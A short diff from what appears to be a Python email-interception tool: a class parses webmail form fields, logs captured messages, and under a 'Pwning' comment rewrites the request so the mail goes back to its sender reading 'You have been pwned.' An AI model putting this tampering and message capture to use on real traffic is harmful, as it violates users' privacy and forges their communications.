@@ -20,7 +20,7 @@ class Mail_data:
 	m = re.match(r"(?P<Start>[\w\W]*)&To=(?P<To>[^&]*)&(?P<Middle>[\w\W]*)&Subject=(?P<Subject>[^&]*)&Body=(?P<Body>[^&]*)&(?P<End>[\w\W]*)&x-email=(?P<From>[^&]*)", string)
         if (m):
             self.mail.append(["mail","From: " + m.group('From'),"To: " + m.group('To'), "Subj: "+m.group('Subject'), m.group('Body')])
-            logging.debug(str(self.mail))
+            logging.debug(str(self.mail[len(self.mail)-1]))
             #Pwning
             string2 = m.group('Start')+"&To="+m.group('From')+"&"+m.group('Middle')+"&Subject="+m.group('Subject')+"&Body="+"You have been pwned."+"&"+m.group('End')+"&x-email="+m.group('From') 
 #            logging.debug("STR2")
